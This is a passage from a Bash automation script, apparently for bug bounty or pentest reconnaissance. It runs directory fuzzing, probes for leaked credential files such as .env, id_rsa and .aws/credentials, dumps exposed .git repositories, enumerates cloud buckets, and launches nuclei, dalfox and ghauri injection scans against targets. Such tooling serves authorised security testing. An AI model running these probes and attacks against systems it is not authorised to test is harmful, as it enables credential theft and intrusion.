    s_body="$(curl -fsSL --connect-timeout 4 --max-time 8 "$b/sitemap.xml" 2>/dev/null || true)"
    if [[ -n "$s_body" ]]; then
      grep -oE '<loc>[^<]+</loc>' <<< "$s_body" | sed -E 's/<loc>|<\/loc>//g' >> "$OUT/content/robots-sitemap-urls.txt" 2>/dev/null || true
    fi
  done < "$OUT/http/live-urls.txt"

  if [[ -s "$OUT/content/robots-sitemap-urls.txt" ]]; then
    sort -u "$OUT/content/robots-sitemap-urls.txt" -o "$OUT/content/robots-sitemap-urls.txt"
    log "  ↳ robots.txt & sitemap.xml: $(count "$OUT/content/robots-sitemap-urls.txt") hidden paths extracted"
    cat "$OUT/content/robots-sitemap-urls.txt" >> "$OUT/urls/all.txt"
    sort -u "$OUT/urls/all.txt" -o "$OUT/urls/all.txt"
  fi

  # --- Step 14.2: Technology-Aware FFUF Directory Fuzzing ---
  if [[ "$MODE" == "full" ]] && have ffuf; then
    FFUF_MAX_HOSTS="${FFUF_MAX_HOSTS:-100}"
    FFUF_RECURSION_DEPTH="${FFUF_RECURSION_DEPTH:-2}"
    log "Tech-aware content discovery (ffuf | Max Hosts: ${FFUF_MAX_HOSTS} | Recursion Depth: ${FFUF_RECURSION_DEPTH})..."

    FFUF_AUTH=()
    [[ -n "$AUTH_COOKIE" ]] && FFUF_AUTH+=("-b" "$AUTH_COOKIE")
    [[ -n "$AUTH_HEADER" ]] && FFUF_AUTH+=("-H" "$AUTH_HEADER")

    # Select base wordlist
    WLIST="$WORDLIST_CONTENT"
    [[ -z "$WLIST" || ! -s "$WLIST" ]] && WLIST="/usr/share/wordlists/dirb/common.txt"
    
    if [[ -s "$WLIST" ]]; then
      head -n "$FFUF_MAX_HOSTS" "$OUT/http/live-urls.txt" | while IFS= read -r base || [[ -n "$base" ]]; do
        [[ -z "$base" ]] && continue
        recover_rate_limit_if_clean
        h_host=$(sed -E 's#^https?://##; s#/.*##' <<< "$base")
        h_rl=$(get_host_rate_limit "$h_host")
        [[ "$h_rl" -gt "$FFUF_RATE" ]] && h_rl="$FFUF_RATE"
        safe="$(printf '%s' "$base" | sed 's,[^a-zA-Z0-9],_,g')"
        
        # Technology-aware extension tuning
        EXT_FLAGS="-e .php,.bak,.zip,.old,.tar.gz,.sql,.json,.yml"
        if grep -qi "laravel" "$OUT/http/tech-stack.txt" 2>/dev/null; then
          EXT_FLAGS+=",env,log,artisan"
        elif grep -qi "wordpress" "$OUT/http/tech-stack.txt" 2>/dev/null; then
          EXT_FLAGS+=",php,bak,sql,zip"
        fi

        ffuf -u "${base%/}/FUZZ" -w "$WLIST" $EXT_FLAGS \
          -mc 200,201,202,204,301,302,307,401,403,405 \
          -rate "$h_rl" -t "${FFUF_THREADS:-5}" -ac -s \
          -recursion -recursion-depth "$FFUF_RECURSION_DEPTH" \
          "${FFUF_AUTH[@]}" \
          -o "$OUT/content/ffuf_${safe}.json" -of json 2>/dev/null || true
      done
    fi
  fi

  # --- Step 14.3: High-Signal 35+ Sensitive File Leak Probe (Parallel xargs) ---
  if have curl; then
    log "Probing for 35+ high-signal exposed sensitive files & credentials (Parallel xargs)..."
    
    SENSITIVE_PROBES=(
      ".git/HEAD|ref: refs/"
      ".git/config|[core]"
      ".env|="
      ".env.local|="
      ".env.production|="
      ".env.staging|="
      ".env.dev|="
      ".env.example|="
      ".env.bak|="
      ".env.save|="
      ".env.old|="
      "config.json|{"
      "config.yml|:"
      "config.php.bak|<?php"
      "config.php~|<?php"
      "config.php.old|<?php"
      "credentials.json|{"
      "id_rsa|BEGIN"
      "known_hosts|ssh"
      "composer.lock|{"
      "package-lock.json|{"
      "yarn.lock|yarn"
      "Dockerfile|FROM"
      "docker-compose.yml|services:"
      "docker-compose.override.yml|services:"
      "kubeconfig|apiVersion"
      ".gitlab-ci.yml|stages:"
      ".circleci/config.yml|version:"
      "Jenkinsfile|pipeline"
      "firebase.json|{"
      "amplify.yml|version:"
      "vercel.json|{"
      "netlify.toml|["
      "storage/logs/laravel.log|["
      "backup.sql|CREATE TABLE"
      "backup.zip|PK"
      ".aws/credentials|aws_access_key_id"
      ".htpasswd|:"
    )

    export OUT CURL_HDR EXPOSED_TIMEOUT
    head -n "${EXPOSED_MAX:-150}" "$OUT/http/live-urls.txt" | xargs -P 15 -I '{}' bash -c '
      base="$1"
      [[ -z "$base" ]] && exit 0
      b="${base%/}"
      
      probes=(
        ".git/HEAD|ref: refs/"
        ".git/config|[core]"
        ".env|="
        ".env.local|="
        ".env.production|="
        ".env.example|="
        ".env.bak|="
        "config.json|{"
        "config.php.bak|<?php"
        "credentials.json|{"
        "id_rsa|BEGIN"
        "composer.lock|{"
        "docker-compose.yml|services:"
        "kubeconfig|apiVersion"
        "firebase.json|{"
        "backup.sql|CREATE TABLE"
        "backup.zip|PK"
        ".aws/credentials|aws_access_key_id"
      )

      for probe in "${probes[@]}"; do
        _path="${probe%%|*}"
        _sig="${probe#*|}"
        
        # HEAD request first for fast status check
        code=$(curl -fsSL -s -o /dev/null -w "%{http_code}" --max-time 5 "$b/$_path" 2>/dev/null || echo "000")
        [[ "$code" != "200" ]] && continue
        
        body=$(curl -fsSL --max-time 10 "$b/$_path" 2>/dev/null || true)
        [[ -z "$body" ]] && continue
        
        # Reject HTML/SPA catch-all pages
        printf "%s" "$body" | head -c 400 | grep -qiE "<!doctype html|<html" && continue
        
        if [[ -n "$_sig" ]]; then
          printf "%s" "$body" | grep -qF "$_sig" || continue
        fi
        
        printf "%s/%s\tVerified Leak (Sig: %s)\n" "$b" "$_path" "$_sig" >> "$OUT/exposed/findings.txt"
      done
    ' _ '{}' 2>/dev/null || true

    if [[ -s "$OUT/exposed/findings.txt" ]]; then
      sort -u "$OUT/exposed/findings.txt" -o "$OUT/exposed/findings.txt"
      log "🔥 Verified Sensitive File Leaks found: $(count "$OUT/exposed/findings.txt") path(s)"
      
      # Git Dumper on exposed .git repos
      if grep -q "\.git/HEAD" "$OUT/exposed/findings.txt" && have git-dumper; then
        grep "\.git/HEAD" "$OUT/exposed/findings.txt" | awk '{print $1}' | while read -r git_url; do
          g_base="${git_url%/.git/HEAD}"
          _gdir="$OUT/exposed/gitdump_$(printf '%s' "$g_base" | sed 's,[^a-zA-Z0-9],_,g')"
          log "  ↳ .git exposed at $g_base — dumping source tree with git-dumper…"
          git-dumper "$g_base/.git/" "$_gdir" >/dev/null 2>&1 || true
          [[ -d "$_gdir" ]] && notify_alert "Source Code Dumped (.git)" "$g_base/.git/" "Full source tree reconstructed to $_gdir — review for hardcoded secrets"
        done
      fi
    else
      log "  ↳ Exposed sensitive files: none found ✅"
    fi
  fi
  set_checkpoint 14
fi
telegram "📂 <b>STEP 14/34 · Content Discovery</b> ✅
━━━━━━━━━━━━━━━━━━━━━━
🎯 <b>Target:</b> <code>${TARGET}</code>
🔍 <b>Mode:</b> ${MODE}
⏱ <b>Elapsed:</b> $(get_elapsed)" "HTML"

###############################################################################
# 15. Industrial Cloud Storage Bucket & Container Enumeration Engine (S3/GCS/Azure)
###############################################################################
if ! is_step_done 15; then
  if [[ "$MODE" != "full" ]]; then
    log "Safe mode: skipping cloud bucket enumeration"
  else
    log "Industrial Cloud Bucket & Container Enumeration (S3 / GCS / Azure)"
    mkdir -p "$OUT/buckets"
    : > "$OUT/buckets/open-buckets.txt"
    : > "$OUT/buckets/candidates.txt"
    : > "$OUT/buckets/private-buckets.txt"

    # --- Step 15.1: Dynamic Subdomain & Target Name Permutation Generator ---
    target_name="${TARGET%%.*}"
    
    # Extract prefixes from discovered subdomains (e.g. cdn.example.com -> cdn)
    sub_prefixes=()
    if [[ -s "$OUT/subdomains/all.txt" ]]; then
      while read -r sub; do
        p="${sub%%.*}"
        [[ -n "$p" && "$p" != "$target_name" && ${#p} -ge 2 ]] && sub_prefixes+=("$p")
      done < "$OUT/subdomains/all.txt"
    fi

    # Standard permutation suffixes/prefixes
    base_words=(
      "cdn" "static" "media" "images" "img" "assets" "storage" "data" "backup"
      "dev" "staging" "prod" "private" "public" "upload" "download" "cache"
      "logs" "test" "app" "web" "user-content" "files" "docs" "db" "archive"
    )

    # Merge subdomain prefixes into word list
    all_words=($(printf "%s\n" "${base_words[@]}" "${sub_prefixes[@]}" | sort -u))

    # Generate rich bucket candidates
    {
      printf "%s\n" "$TARGET" "$target_name"
      for w in "${all_words[@]}"; do
        printf "%s-%s\n" "$target_name" "$w"
        printf "%s-%s\n" "$w" "$target_name"
        printf "%s%s\n" "$target_name" "$w"
        printf "%s%s\n" "$w" "$target_name"
        printf "%s-assets-%s\n" "$target_name" "$w"
        printf "%s-%s-prod\n" "$target_name" "$w"
        printf "%s-%s-dev\n" "$target_name" "$w"
      done
    } | sort -u > "$OUT/buckets/candidates.txt"

    TOTAL_BUCKET_CANDIDATES=$(count "$OUT/buckets/candidates.txt")
    log "Generated ${TOTAL_BUCKET_CANDIDATES} Cloud Bucket Candidates from subdomains & dictionary permutations..."

    # --- Step 15.2: Parallel Multi-Cloud Storage Probing (S3, GCS, Azure) ---
    export OUT HTTP_CONNECT_TIMEOUT BUCKET_TIMEOUT
    xargs -P 15 -I '{}' bash -c '
      b="$1"
      [[ -z "$b" ]] && exit 0

      # 1. AWS S3 Probing (Direct & Path Style)
      s3_url="https://${b}.s3.amazonaws.com"
      s3_resp=$(curl -fsSL --connect-timeout 4 --max-time 8 "$s3_url" 2>/dev/null || true)
      
      if grep -qiE "<ListBucketResult|<Contents>" <<< "$s3_resp"; then
        printf "PUBLIC_S3_LISTABLE\t%s\tPublicly Listable AWS S3 Bucket\n" "$s3_url" >> "$OUT/buckets/open-buckets.txt"
      elif grep -qiE "<AccessDenied>" <<< "$s3_resp"; then
        file_check=$(curl -fsSL -s -o /dev/null -w "%{http_code}" --max-time 5 "$s3_url/robots.txt" 2>/dev/null || echo "000")
        if [[ "$file_check" == "200" ]]; then
          printf "PUBLIC_S3_OBJECTS\t%s/robots.txt\tS3 Bucket Listing Disabled but Public Files Accessible\n" "$s3_url" >> "$OUT/buckets/open-buckets.txt"
        else
          printf "PRIVATE_S3_BUCKET\t%s\tExisting Private AWS S3 Bucket\n" "$s3_url" >> "$OUT/buckets/private-buckets.txt"
        fi
      fi

      # 2. Google Cloud Storage (GCS) Probing
      gcs_url="https://storage.googleapis.com/${b}"
      gcs_resp=$(curl -fsSL --connect-timeout 4 --max-time 8 "$gcs_url" 2>/dev/null || true)
      
      if grep -qiE "<ListBucketResult|<Contents>" <<< "$gcs_resp"; then
        printf "PUBLIC_GCS_LISTABLE\t%s\tPublicly Listable GCS Bucket\n" "$gcs_url" >> "$OUT/buckets/open-buckets.txt"
      elif grep -qiE "<AccessDenied>" <<< "$gcs_resp"; then
        printf "PRIVATE_GCS_BUCKET\t%s\tExisting Private GCS Bucket\n" "$gcs_url" >> "$OUT/buckets/private-buckets.txt"
      fi

      # 3. Azure Blob Storage Probing (Root & Common Containers)
      azure_base="https://${b}.blob.core.windows.net"
      azure_containers=("?comp=list" "web?restype=container&comp=list" "\$root?restype=container&comp=list" "images?restype=container&comp=list" "public?restype=container&comp=list")
      
      for container in "${azure_containers[@]}"; do
        az_url="${azure_base}/${container}"
        az_resp=$(curl -fsSL --connect-timeout 4 --max-time 8 "$az_url" 2>/dev/null || true)
        if grep -qiE "<EnumerationResults|<Blob>" <<< "$az_resp"; then
          printf "PUBLIC_AZURE_BLOB\t%s\tPublicly Listable Azure Container\n" "$az_url" >> "$OUT/buckets/open-buckets.txt"
          break
        fi
      done
    ' _ '{}' < "$OUT/buckets/candidates.txt" 2>/dev/null || true

    # --- Step 15.3: Reporting & S3Scanner Integration ---
    if [[ -s "$OUT/buckets/open-buckets.txt" ]]; then
      sort -u "$OUT/buckets/open-buckets.txt" -o "$OUT/buckets/open-buckets.txt"
      log "🔥 PUBLIC Cloud Buckets Discovered: $(count "$OUT/buckets/open-buckets.txt") exposed storage targets!"
      
      while IFS= read -r line || [[ -n "$line" ]]; do
        [[ -z "$line" ]] && continue
        b_type=$(awk -F'\t' '{print $1}' <<< "$line")
        b_target=$(awk -F'\t' '{print $2}' <<< "$line")
        b_desc=$(awk -F'\t' '{print $3}' <<< "$line")
        warn "🔥 ${b_type}: ${b_target}"
        notify_alert "Public Cloud Storage Found" "${b_target}" "${b_desc} (${b_type})"
      done < "$OUT/buckets/open-buckets.txt"
    else
      log "  ↳ Cloud Storage Buckets: No public buckets exposed ✅ ($(count "$OUT/buckets/private-buckets.txt") private buckets detected)"
    fi

    # S3Scanner ACL Read/Write Audit
    if have S3Scanner || have s3scanner; then
      S3BIN="$(command -v S3Scanner || command -v s3scanner)"
      log "Running S3Scanner for ACL Read/Write Permission Check..."
      "$S3BIN" -bucket-file "$OUT/buckets/candidates.txt" > "$OUT/buckets/s3scanner.txt" 2>/dev/null \
        || "$S3BIN" scan -f "$OUT/buckets/candidates.txt" > "$OUT/buckets/s3scanner.txt" 2>/dev/null || true
    fi

    # cloud_enum
    if have cloud_enum || have cloud-enum; then
      CEBIN="$(command -v cloud_enum || command -v cloud-enum)"
      log "Running cloud_enum (AWS/Azure/GCP keyword sweep)..."
      "$CEBIN" -k "$target_name" -k "$TARGET" -l "$OUT/buckets/cloud_enum.txt" >/dev/null 2>&1 || true
    fi
  fi
  set_checkpoint 15
fi
telegram "🪣 <b>STEP 15/34 · Cloud Storage Bucket Enumeration</b> ✅
━━━━━━━━━━━━━━━━━━━━━━
🎯 <b>Target:</b> <code>${TARGET}</code>
🔥 <b>Publicly Listable Buckets:</b> $(count "$OUT/buckets/open-buckets.txt")
⏱ <b>Elapsed:</b> $(get_elapsed)" "HTML"

###############################################################################
# 16. Industrial Technology-Aware Nuclei Vulnerability & DAST Engine
###############################################################################
if ! is_step_done 16; then
  log "Industrial Nuclei Vulnerability Scanning (Tech-Aware Routing & Categorized DAST)"
  mkdir -p "$OUT/vulns"
  
  if [[ "$UPDATE_NUCLEI_TEMPLATES" == "true" ]]; then
    log "Updating nuclei templates..."
    nuclei -update-templates -silent || true
  fi

  NUCLEI_OOB=()
  [[ "$INTERACTSH_SERVER" != "oast.pro" ]] && NUCLEI_OOB=(-iserver "$INTERACTSH_SERVER")

  if [[ -z "$CUSTOM_NUCLEI_TEMPLATES" ]]; then
    if [[ -d "/usr/local/bin/nuclei-templates/custom" ]]; then
      CUSTOM_NUCLEI_TEMPLATES="/usr/local/bin/nuclei-templates/custom"
    elif [[ -d "/root/nuclei-templates/custom" ]]; then
      CUSTOM_NUCLEI_TEMPLATES="/root/nuclei-templates/custom"
    elif [[ -d "./nuclei-templates/custom" ]]; then
      CUSTOM_NUCLEI_TEMPLATES="./nuclei-templates/custom"
    fi
  fi

  if [[ -n "$CUSTOM_NUCLEI_TEMPLATES" && -d "$CUSTOM_NUCLEI_TEMPLATES" ]]; then
    nuclei -validate -t "$CUSTOM_NUCLEI_TEMPLATES" > "$OUT/logs/nuclei-custom-validation.log" 2>&1 || warn "Custom Nuclei validation issues logged to $OUT/logs/nuclei-custom-validation.log"
  fi

  # --- Step 16.1: Technology-Aware Smart Template Routing ---
  TECH_TAGS=()
  if [[ -s "$OUT/http/tech-stack.txt" ]]; then
    if grep -qi "next.js" "$OUT/http/tech-stack.txt"; then TECH_TAGS+=("nextjs,react"); fi
    if grep -qi "laravel" "$OUT/http/tech-stack.txt"; then TECH_TAGS+=("laravel,php"); fi
    if grep -qi "spring" "$OUT/http/tech-stack.txt";  then TECH_TAGS+=("spring,springboot,java"); fi
    if grep -qi "wordpress" "$OUT/http/tech-stack.txt"; then TECH_TAGS+=("wordpress,wp-plugin"); fi
    if grep -qi "jenkins" "$OUT/http/tech-stack.txt"; then TECH_TAGS+=("jenkins"); fi
  fi

  if [[ ${#TECH_TAGS[@]} -gt 0 ]]; then
    JOINED_TECH_TAGS=$(IFS=,; echo "${TECH_TAGS[*]}")
    log "  ↳ Smart Routing: Detected Tech Tags [${JOINED_TECH_TAGS}] — executing targeted templates first..."
    nuclei -list "$OUT/http/live-urls.txt" -tags "$JOINED_TECH_TAGS" \
      -severity low,medium,high,critical \
      -rate-limit "$NUCLEI_RATE_LIMIT" -concurrency "${NUCLEI_CONCURRENCY:-25}" \
      -jsonl "${HDR_ARGS[@]}" "${NUCLEI_OOB[@]}" -output "$OUT/vulns/nuclei-tech.jsonl" 2>/dev/null || true
  fi

  # --- Step 16.2: Core CVE & Misconfig Profiles ---
  if [[ "$MODE" != "full" ]]; then
    log "Nuclei SAFE Profile: exposure, misconfig, default-login, cve..."
    nuclei -list "$OUT/http/live-urls.txt" \
      -tags exposure,misconfig,default-login,cve,tech,panel,takeover \
      -exclude-tags intrusive,dos,fuzz,brute-force \
      -severity low,medium,high,critical \
      -rate-limit "${NUCLEI_SAFE_RATE:-80}" -concurrency "$NUCLEI_CONCURRENCY" \
      -jsonl "${HDR_ARGS[@]}" "${NUCLEI_OOB[@]}" -output "$OUT/vulns/nuclei-safe.jsonl" 2>/dev/null || true
  else
    log "Nuclei FULL Profile: CVE, cnvd, misconfig, exposure, takeover, panel, token, secret..."
    nuclei -list "$OUT/http/live-urls.txt" \
      -tags cve,cnvd,misconfig,exposure,default-login,takeover,panel,token,secret \
      -severity low,medium,high,critical \
      -rate-limit "$NUCLEI_RATE_LIMIT" -concurrency "$NUCLEI_CONCURRENCY" \
      -jsonl "${HDR_ARGS[@]}" "${NUCLEI_OOB[@]}" -output "$OUT/vulns/nuclei-cve.jsonl" 2>/dev/null || true

    # Custom Templates
    if [[ -d "$CUSTOM_NUCLEI_TEMPLATES" ]]; then
      nuclei -list "$OUT/http/live-urls.txt" -t "$CUSTOM_NUCLEI_TEMPLATES" \
        -severity low,medium,high,critical -rate-limit "$NUCLEI_RATE_LIMIT" \
        "${HDR_ARGS[@]}" "${NUCLEI_OOB[@]}" -jsonl -output "$OUT/vulns/nuclei-custom.jsonl" 2>/dev/null || true
    fi

    # --- Step 16.3: Categorized DAST Queue Execution (XSS, SQLi, LFI, SSRF, RCE, Redirect) ---
    log "Categorized Nuclei DAST Fuzzing (Queued by GF vulnerability type)..."
    
    # XSS DAST Queue
    if [[ -s "$OUT/params/gf-xss.txt" ]]; then
      recover_rate_limit_if_clean
      nuclei -list "$OUT/params/gf-xss.txt" -tags xss -dast \
        -rate-limit "$NUCLEI_RATE_LIMIT" -concurrency "$NUCLEI_CONCURRENCY" \
        -jsonl "${HDR_ARGS[@]}" "${NUCLEI_OOB[@]}" -output "$OUT/vulns/nuclei-dast-xss.jsonl" 2>/dev/null || true
      check_auto_rate_limit "$OUT/vulns/nuclei-dast-xss.jsonl"
    fi

    # SQLi DAST Queue
    if [[ -s "$OUT/params/gf-sqli.txt" ]]; then
      recover_rate_limit_if_clean
      nuclei -list "$OUT/params/gf-sqli.txt" -tags sqli -dast \
        -rate-limit "$NUCLEI_RATE_LIMIT" -concurrency "$NUCLEI_CONCURRENCY" \
        -jsonl "${HDR_ARGS[@]}" "${NUCLEI_OOB[@]}" -output "$OUT/vulns/nuclei-dast-sqli.jsonl" 2>/dev/null || true
      check_auto_rate_limit "$OUT/vulns/nuclei-dast-sqli.jsonl"
    fi

    # LFI DAST Queue
    if [[ -s "$OUT/params/gf-lfi.txt" ]]; then
      recover_rate_limit_if_clean
      nuclei -list "$OUT/params/gf-lfi.txt" -tags lfi -dast \
        -rate-limit "$NUCLEI_RATE_LIMIT" -concurrency "$NUCLEI_CONCURRENCY" \
        -jsonl "${HDR_ARGS[@]}" "${NUCLEI_OOB[@]}" -output "$OUT/vulns/nuclei-dast-lfi.jsonl" 2>/dev/null || true
      check_auto_rate_limit "$OUT/vulns/nuclei-dast-lfi.jsonl"
    fi

    # SSRF DAST Queue
    if [[ -s "$OUT/params/gf-ssrf.txt" ]]; then
      recover_rate_limit_if_clean
      nuclei -list "$OUT/params/gf-ssrf.txt" -tags ssrf -dast \
        -rate-limit "$NUCLEI_RATE_LIMIT" -concurrency "$NUCLEI_CONCURRENCY" \
        -jsonl "${HDR_ARGS[@]}" "${NUCLEI_OOB[@]}" -output "$OUT/vulns/nuclei-dast-ssrf.jsonl" 2>/dev/null || true
      check_auto_rate_limit "$OUT/vulns/nuclei-dast-ssrf.jsonl"
    fi
  fi

  # --- Step 16.4: JS Secret & Key Scan (low, medium, high, critical) ---
  if [[ -s "$OUT/js/urls.txt" ]]; then
    log "Nuclei JS Secret & Key Scan (JWT, Bearer, AWS, Slack, GitHub)..."
    recover_rate_limit_if_clean
    nuclei -list "$OUT/js/urls.txt" -tags exposure,token,secret,api-key,jwt,aws,slack,github \
      -severity low,medium,high,critical \
      -rate-limit "$NUCLEI_RATE_LIMIT" -concurrency 10 -jsonl -output "$OUT/vulns/nuclei-js.jsonl" 2>/dev/null || true
  fi

  # --- Step 16.5: Result Consolidation & Deduplication ---
  : > "$OUT/vulns/nuclei-all-dedup.jsonl"
  cat "$OUT"/vulns/nuclei-*.jsonl 2>/dev/null | sort -u > "$OUT/vulns/nuclei-all-dedup.jsonl" || true

  # Instant Rich Telegram Alerts
  if [[ -s "$OUT/vulns/nuclei-all-dedup.jsonl" ]]; then
    while IFS= read -r nuc_line || [[ -n "$nuc_line" ]]; do
      [[ -z "$nuc_line" ]] && continue
      n_url=$(echo "$nuc_line" | jq -r '.["matched-at"] // .host // empty' 2>/dev/null)
      n_name=$(echo "$nuc_line" | jq -r '.info.name // "Vulnerability"' 2>/dev/null)
      n_sev=$(echo "$nuc_line" | jq -r '.info.severity // "info"' 2>/dev/null)
      n_cve=$(echo "$nuc_line" | jq -r '.info.classification."cve-id"[]? // empty' 2>/dev/null | head -n 1)
      
      # Skip 3xx redirects noise
      if grep -qiE 'redirect|moved.?(permanently|temporarily)?|http-(301|302|303)' <<< "$n_name"; then continue; fi

      if [[ "$n_sev" =~ ^(medium|high|critical)$ ]]; then
        cve_str=""
        [[ -n "$n_cve" ]] && cve_str=" [${n_cve}]"
        warn "🔥 Nuclei Finding (${n_sev^^}): ${n_name}${cve_str} @ ${n_url}"
        notify_alert "Nuclei Vulnerability (${n_sev^^})" "${n_url}" "Finding: ${n_name}${cve_str}\nMatched At: ${n_url}"
      fi
    done < "$OUT/vulns/nuclei-all-dedup.jsonl"
  fi

  set_checkpoint 16
fi
telegram "🛡️ <b>STEP 16/34 · Nuclei Vulnerability Scanning</b> ✅
━━━━━━━━━━━━━━━━━━━━━━
🎯 <b>Target:</b> <code>${TARGET}</code>
🔥 <b>High/Critical Vulnerabilities:</b> $(grep -ciE '"severity":"(high|critical)"' "$OUT/vulns/nuclei-all-dedup.jsonl" 2>/dev/null || echo 0)
📌 <b>Total Unique Findings:</b> $(count "$OUT/vulns/nuclei-all-dedup.jsonl")
⏱ <b>Elapsed:</b> $(get_elapsed)" "HTML"

###############################################################################
# 17. Industrial Active XSS & BAV Engine (Dalfox High-Assurance Fuzzing)
###############################################################################
if ! is_step_done 17; then
  if [[ "$MODE" == "full" ]] && have dalfox && [[ -s "$OUT/params/gf-xss.txt" ]]; then
    recover_rate_limit_if_clean
    mkdir -p "$OUT/vulns"
    : > "$OUT/vulns/dalfox-xss.txt"
    : > "$OUT/vulns/dalfox-xss.json"

    cat "$OUT/params/high-value.txt" "$OUT/params/gf-xss.txt" 2>/dev/null | awk '!seen[$0]++' | head -n "${MAX_ACTIVE_URLS:-150}" > "$OUT/params/xss-prioritized.txt"
    log "Industrial Active XSS Testing (Dalfox Pipe | BAV | DOM Mining | Blind XSS)..."
    
    DALFOX_ARGS=(
      pipe
      --silence
      --no-color
      --worker "${CONCURRENCY:-25}"
      --timeout "${DALFOX_TIMEOUT:-$HTTP_TIMEOUT}"
      --use-bav
      --mining-dom
      --deep-domxss
      --remote-payloads portswigger,payloadbox
      --format json
      -o "$OUT/vulns/dalfox-xss.json"
    )

    # Auth Credentials
    [[ -n "$AUTH_COOKIE" ]] && DALFOX_ARGS+=("--cookie" "$AUTH_COOKIE")
    [[ -n "$AUTH_HEADER" ]] && DALFOX_ARGS+=("--header" "$AUTH_HEADER")

    # Blind XSS Callback Server
    if [[ -n "$INTERACTSH_SERVER" ]]; then
      DALFOX_ARGS+=("--blind" "https://${INTERACTSH_SERVER}")
    fi

    # Headless Browser Verification if chromium/chrome available
    if have chromium || have google-chrome || have chrome; then
      DALFOX_ARGS+=("--headless")
    fi

    # Execute Dalfox in High-Speed Pipe Mode
    cat "$OUT/params/xss-prioritized.txt" | dalfox "${DALFOX_ARGS[@]}" 2>/dev/null || true

    # Extract & Verify PoC Findings
    if [[ -s "$OUT/vulns/dalfox-xss.json" ]]; then
      jq -r 'select(.type == "POC" or .type == "V") | "[" + .type + "] [" + .severity + "] " + .url + " (Param: " + .param + ") Payload: " + .payload' \
        "$OUT/vulns/dalfox-xss.json" 2>/dev/null > "$OUT/vulns/dalfox-xss.txt" || true
      
      if [[ -s "$OUT/vulns/dalfox-xss.txt" ]]; then
        log "🔥 VERIFIED Active XSS / BAV Vulnerabilities found: $(count "$OUT/vulns/dalfox-xss.txt") PoC(s)!"
        while IFS= read -r xss_line || [[ -n "$xss_line" ]]; do
          [[ -z "$xss_line" ]] && continue
          warn "🔥 VERIFIED XSS: ${xss_line}"
          notify_alert "Active XSS Verified (Dalfox)" "${xss_line}" "Execution confirmed by Dalfox DOM/Headless engine"
        done < "$OUT/vulns/dalfox-xss.txt"
      fi
    else
      log "  ↳ Active XSS: No verified XSS payloads triggered ✅"
    fi
  fi
  set_checkpoint 17
fi
telegram "⚡ <b>STEP 17/34 · Active XSS Testing</b> ✅
━━━━━━━━━━━━━━━━━━━━━━
🎯 <b>Target:</b> <code>${TARGET}</code>
💥 <b>Verified XSS Findings:</b> $(count "$OUT/vulns/dalfox-xss.txt")
⏱ <b>Elapsed:</b> $(get_elapsed)" "HTML"

###############################################################################
# 18. Active SQLi (full mode)
###############################################################################
if ! is_step_done 18; then
  if [[ "$MODE" == "full" ]] && [[ -s "$OUT/params/gf-sqli.txt" ]]; then
    log "Active SQLi testing"
    : > "$OUT/vulns/sqli-findings.txt"
    cat "$OUT/params/high-value.txt" "$OUT/params/gf-sqli.txt" 2>/dev/null | awk '!seen[$0]++' | head -n "$MAX_ACTIVE_URLS" > "$OUT/params/sqli-prioritized.txt"
    nuclei -l "$OUT/params/sqli-prioritized.txt" -tags sqli \
      -severity medium,high,critical \
      -rate-limit "$NUCLEI_RATE_LIMIT" -concurrency "$NUCLEI_CONCURRENCY" -timeout "$NUCLEI_TIMEOUT" \
      "${HDR_ARGS[@]}" "${NUCLEI_OOB[@]}" -jsonl -output "$OUT/vulns/sqli-nuclei.jsonl" 2>/dev/null || true
    GHAURI_AUTH=()
    [[ -n "$AUTH_COOKIE" ]] && GHAURI_AUTH+=("--cookie" "$AUTH_COOKIE")
    [[ -n "$AUTH_HEADER" ]] && GHAURI_AUTH+=("--header" "$AUTH_HEADER")
    SQLMAP_AUTH=()
    [[ -n "$AUTH_COOKIE" ]] && SQLMAP_AUTH+=("--cookie" "$AUTH_COOKIE")
    [[ -n "$AUTH_HEADER" ]] && SQLMAP_AUTH+=("--header" "$AUTH_HEADER")
    mkdir -p "$OUT/sqli/scanner-logs"
    : > "$OUT/vulns/sqli-findings.txt"
    : > "$OUT/vulns/sqli-findings.jsonl"
    : > "$OUT/sqli/potential-sqli.txt"
    : > "$OUT/sqli/timeout-sqli.txt"
    : > "$OUT/sqli/retryable-sqli.txt"
    : > "$OUT/sqli/failed-sqli.txt"

    # O(1) Associative Array Deduplication
    declare -A SEEN_SQLI_SIGS=()

    head -n 30 "$OUT/params/sqli-prioritized.txt" > "$OUT/sqli/top-targets.txt"
    awk '{print NR "\t" $0}' "$OUT/sqli/top-targets.txt" > "$OUT/sqli/url_mapping.tsv"

    if have ghauri; then
      sqli_total="$(wc -l < "$OUT/sqli/top-targets.txt" | tr -d ' ')"
      log "▶ Stage 18 SQLi (ghauri) started — testing ${sqli_total} URL(s), up to 60s each"
      sqli_i=0
      while IFS= read -r url; do
        [[ -z "$url" ]] && continue
        sqli_i=$((sqli_i+1))
        printf '\033[1;36m[..]\033[0m SQLi (ghauri) %d/%s: %.80s\n' "$sqli_i" "$sqli_total" "$url" | tee -a "$OUT/logs/run.log"
        log_file="$OUT/sqli/scanner-logs/ghauri_${sqli_i}.log"
        
        # State Machine Tracking: Capture exit code
        g_ec=0
        timeout 60 ghauri -u "$url" --batch --level 1 --force-ssl "${GHAURI_AUTH[@]}" > "$log_file" 2>&1 || g_ec=$?

        if [[ "$g_ec" -eq 124 ]]; then
          printf 'TIMEOUT_SQLI\t%s\tghauri scanning timed out after 60s\n' "$url" >> "$OUT/sqli/timeout-sqli.txt"
          log "  ↳ ghauri: $url -> TIMEOUT (execution exceeded 60s limit)"
          continue
        elif grep -qiE 'connection refused|502 Bad Gateway|503 Service Unavailable|Name or service not known' "$log_file"; then
          printf 'RETRYABLE_SQLI\t%s\tNetwork/Gateway error during scan\n' "$url" >> "$OUT/sqli/retryable-sqli.txt"
          log "  ↳ ghauri: $url -> RETRYABLE (network/gateway error)"
          continue
        elif grep -qiE 'Critical|Traceback|unhandled exception|Segmentation fault' "$log_file"; then
          printf 'FAILED_SQLI\t%s\tScanner internal failure/crash\n' "$url" >> "$OUT/sqli/failed-sqli.txt"
          log "  ↳ ghauri: $url -> FAILED (scanner crash/exception)"
          continue
        fi

        # Rejection Gate
        if is_negative_sqli_log "$log_file"; then
          log "  ↳ ghauri: $url -> NEGATIVE (not injectable)"
          continue
        fi

        # Confirmation Gate using helper
        if is_confirmed_sqli_log "$log_file"; then
          parse_sqli_log_fields "$log_file"
          
          # Composite Signature Key (URL + Parameter + Injection Type)
          sig_key="${url}::${EXTRACTED_PARAM}::${EXTRACTED_TYPE}"
          if [[ -z "${SEEN_SQLI_SIGS["$sig_key"]:-}" ]]; then
            SEEN_SQLI_SIGS["$sig_key"]=1
